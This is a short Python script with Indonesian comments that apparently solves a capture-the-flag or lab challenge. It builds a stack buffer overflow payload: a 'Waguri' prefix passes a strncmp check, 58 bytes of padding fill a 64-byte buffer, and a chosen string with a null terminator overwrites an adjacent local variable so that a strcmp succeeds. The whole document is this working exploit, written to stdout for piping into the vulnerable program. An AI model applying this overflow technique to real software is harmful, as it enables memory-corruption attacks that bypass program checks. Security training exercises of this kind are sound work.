import sys

# 1. Prefix: Memenuhi syarat strncmp("Waguri", 6)
prefix = b'Waguri'
PREFIX_LEN = len(prefix)

# 2. String Target yang harus menimpa local_28
target_string = b'bete bat gw ada karbit'

# 3. Hitung Padding
# Offset ke local_28 diasumsikan 64 bytes (ukuran local_68)
OFFSET = 64
padding_len = OFFSET - PREFIX_LEN  # 64 - 6 = 58 bytes
padding = b'A' * padding_len

# 4. Null Terminator
# Penting agar target_string berakhir dengan '\0' untuk strcmp()
null_terminator = b'\x00'

# Konstruksi Payload:
# local_68[0:6] = prefix
# local_68[6:64] = padding
# local_28 = target_string
payload = prefix + padding + target_string + null_terminator

# Kirim payload biner
sys.stdout.buffer.write(payload)

print(f"\n[INFO] Payload berhasil dibuat dengan total {len(payload)} bytes.")
